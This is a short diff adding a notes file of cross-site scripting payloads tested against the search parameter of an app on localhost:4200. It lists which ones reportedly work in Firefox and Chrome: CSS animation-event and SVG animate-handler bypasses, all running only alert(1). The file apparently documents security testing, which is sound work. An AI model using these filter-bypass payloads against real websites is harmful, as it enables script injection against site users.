@@ -1,0 +1,8 @@
+# Not working
+http://localhost:4200/?search=<script>alert(1)</script>
+
+# Working in Firefox und Chrome
+http://localhost:4200/?search=<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
+http://localhost:4200/?search=<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>
+http://localhost:4200/?search=<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+http://localhost:4200/?search=<svg><animate onend=alert(1) attributeName=x dur=1s>
